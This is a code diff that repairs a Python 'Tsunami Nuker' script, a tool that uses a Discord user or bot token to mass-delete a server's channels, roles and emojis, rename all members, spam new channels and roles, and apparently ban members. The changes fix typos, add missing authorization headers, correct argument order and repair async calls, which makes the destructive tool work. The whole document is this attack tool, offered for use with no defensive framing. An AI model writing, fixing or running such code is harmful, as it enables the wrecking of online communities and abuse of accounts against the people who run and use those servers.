@@ -8,27 +8,45 @@ from os import _exit, system, remove
 
 system('cls & mode 120,20 & title Tsunami Nuker - Loading')
 token = input('\x1b[37;5;56m[\x1b[34;5;56mTOKEN\x1b[37;5;56m]:  \x1b[0m')
+if not token:
+    print('Error: token not found')
+    _exit(1) 
 system('cls')
 session = FuturesSession()
 
 def check():
-    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'{token}'})
+    print('Validating Discord token...')
+
+    # Try as bot token first
+    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'Bot {token}'})
+    print(f'Bot token attempt: Status {r.status_code}')
     if r.status_code == 200:
-        return "user"
-    else:
+        print('Valid bot token detected')
         return "bot"
 
+    # Try as user token
+    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'{token}'})
+    print(f'User token attempt: Status {r.status_code}')
+    if r.status_code == 200:
+        print('Valid user token detected')
+        return "user"
+
+    # If both fail, show more details
+    print(f'Error: Invalid Discord token (Bot: {r.status_code})')
+    print('Please check that your token is correct')
+    _exit(1)
+    
 tsu_token = check() 
 intents = discord.Intents.all()
 intents.members = True
 
 if tsu_token == "user":
     headers = {'Authorization': f'{token}'}
-    client = commands.Bot(command_prefix='tsu', case_insenitive=True, self_bot=True, intents=intents)
+    client = discord.Client(intents=intents)
 elif tsu_token == "bot":
     headers = {'Authorization': f'Bot {token}'}
     client = commands.Bot(command_prefix='tsu', case_insensitive=True, intents=intents)
-
+    
 class Tsunami:
     def __init__(self):
         self.blue = '\x1b[34;5;56m' 
@@ -107,7 +125,7 @@ class Tsunami:
                 'reason': 'Tsunami Nuker 2021'
             }        
             r = session.delete(f'https://canary.discordapp.com/api/v9/channels/{str(channel)}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -123,7 +141,7 @@ class Tsunami:
                 'reason': 'Tsunami Nuker 2021'
             }        
             r = session.delete(f'https://discord.com/api/v9/channels/{channel}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -138,8 +156,8 @@ class Tsunami:
             payload = {
                 'reason': 'TSUNAMI NUKER 2021'
             }
-            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}', json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            r = session.delete(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/roles/{str(role)}', headers=headers, json=payload).result()
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -148,14 +166,14 @@ class Tsunami:
                 break
             else:
                 print(f'{self.white}[{self.red}FAILED TO DELETE {role.strip()}{self.white}]{self.reset}') 
- 
+
     def deleteroles2(self, guild, role):
         while True:
             payload = {
                 'reason': 'TSUNAMI NUKER 2021'
             }
             r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{role}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -171,7 +189,7 @@ class Tsunami:
                 'reason': 'TSUNAMI NUKER 2021'
             }
             r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/emojis/{emoji}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {emoji.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -186,8 +204,8 @@ class Tsunami:
             payload = {
                 'nick': name
             }
-            r = requests.patch(f'https://discord.com/api/v9/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            r = session.patch(f'https://discord.com/api/v9/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY NICKNAMED {user.strip()}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -204,7 +222,7 @@ class Tsunami:
                 'type': 0
             }
             r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -221,7 +239,7 @@ class Tsunami:
                 'type': 0
             }
             r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=payload)
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -230,7 +248,7 @@ class Tsunami:
                 break
             else:
                 print(f'{self.white}[{self.red}FAILED TO CREATE {name}{self.white}]{self.reset}') 
-            
+
     def spamnsfw(self, guild, name):
         while True:
             payload = {
@@ -239,7 +257,7 @@ class Tsunami:
                 'nsfw': True
             }
             r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -256,7 +274,7 @@ class Tsunami:
                 'type': 2
             }
             r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/channels', headers=headers, json=payload)
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -273,7 +291,7 @@ class Tsunami:
                 'type': 2
             }
             r = requests.post(f'https://canary.discordapp.com/api/v9/guilds/{guild}/roles', headers=headers, json=payload)
-            if r.status_code == 201 or r.status_code == 204 or r.status_codde == 200:
+            if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
             elif r.status_code == 429:
@@ -309,7 +327,7 @@ class Tsunami:
         with open('channels.tsu', 'a') as c:
             for channel in target.channels:
                  c.write(str(channel.id) + '\n')
-            channelcount += 1
+                 channelcount += 1
             print(f'{self.white}[{self.blue}SCRAPED {channelcount} CHANNELS{self.white}]{self.reset}')
             c.close()
 
@@ -425,9 +443,9 @@ class Tsunami:
         name = input(f'{self.white}[{self.blue}NAME{self.white}]: {self.reset}')
         members = open('members.tsu')
         for member in members:
-            Thread(target=self.nicknameall, args=(guild, name, member)).start()
+            Thread(target=self.nicknameall, args=(guild, member, name)).start()
         members.close()    
-
+        
     async def tsuxlux(self):
         system('cls & mode 120,20 & title Tsunami Nuker')
         print(f'''
@@ -454,17 +472,22 @@ class Tsunami:
   {self.blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{self.reset}''')  
         option = input('\x1b[37;5;56m[\x1b[34;5;56mOPTION\x1b[37;5;56m]:  \x1b[0m')
         if option == '1':
-            await self.tsuban() + self.tsuban2() + self.tsuban3() + self.tsuban4()
+            await self.tsuban()
+            await self.tsuban2()
+            await self.tsuban3()
+            await self.tsuban4()
             sleep(1.5)
             system('cls')
             await self.tsuxlux()
         elif option == '2':
-            await self.tsudc() + self.tsudc2()
+            await self.tsudc()
+            await self.tsudc2()
             sleep(1.5)
             system('cls')
             await self.tsuxlux()
         elif option == '3':
-            await self.tsudr() + self.tsudr2()
+            await self.tsudr()
+            await self.tsudr2()
             sleep(1.5)
             system('cls')
             await self.tsuxlux()
@@ -474,7 +497,8 @@ class Tsunami:
             system('cls')
             await self.tsuxlux()
         elif option == '5':
-            await self.tsucc() + self.tsucc2()
+            await self.tsucc()
+            await self.tsucc2()
             sleep(1.5)
             system('cls')
             await self.tsuxlux()
@@ -502,14 +526,14 @@ class Tsunami:
     def TSURUN(self):
         if tsu_token == "user":
             try:
-                client.run(token, bot=False)
-            except:     
-                print(f'{self.white}[{self.red}INVALID TOKEN{self.white}]{self.reset}') 
+                client.run(token)
+            except Exception as e:     
+                print(f'{self.white}[{self.red}CONNECTION ERROR: {str(e)}{self.white}]{self.reset}') 
         elif tsu_token == "bot":
             try:
-                client.run(token, bot=True)
-            except:   
-                print(f'{self.white}[{self.red}INVALID TOKEN{self.white}]{self.reset}') 
+                client.run(token)
+            except Exception as e:   
+                print(f'{self.white}[{self.red}CONNECTION ERROR: {str(e)}{self.white}]{self.reset}') 
         else:
             _exit(0)                  
 
